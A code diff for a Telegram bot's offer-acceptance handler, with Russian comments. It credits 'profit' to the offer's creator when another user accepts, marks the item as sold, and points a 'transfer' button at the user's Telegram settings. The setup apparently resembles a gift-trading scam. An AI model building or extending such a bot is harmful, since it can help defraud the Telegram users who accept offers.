@@ -333,26 +333,20 @@ async def accept_offer(callback: CallbackQuery):
 
     t = TEXTS[data['lang']]
     
-    # 🛑 ЛОГИКА: Берем данные ТОГО, КТО НАЖАЛ КНОПКУ (callback.from_user)
-    # Если вы тестируете сами, это ваш профиль. Если друг — то его.
+    # 🛑 ИЗМЕНЕНИЕ: Ссылка на настройки Telegram
+    url = "tg://settings"
+    
+    # Для текста сообщения берем данные того, кто нажал
     target_username = callback.from_user.username
     target_name = callback.from_user.full_name
-    target_id = callback.from_user.id
+    target = f"@{target_username}" if target_username else target_name
 
-    if target_username:
-        target = f"@{target_username}"
-        url = f"https://t.me/{target_username}"
-    else:
-        target = target_name
-        url = f"tg://user?id={target_id}"
-
-    # Начисляем профит создателю оффера (тому, кто писал /of)
+    # Начисляем профит создателю оффера
     add_profit(data['seller_id'])
 
-    # Показываем окошко
     await callback.answer(text=t['alert'].format(target=target), show_alert=True)
     
-    # Меняем сообщение на "Продано" и ставим кнопку со ссылкой на профиль того, кто нажал
+    # Меняем сообщение и ставим кнопку с новой ссылкой
     kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t['btn_transfer'], url=url)]])
     text = t['sold'].format(gift_name=data['gift_name'], target=target, currency_icon=data['currency_icon'])
     
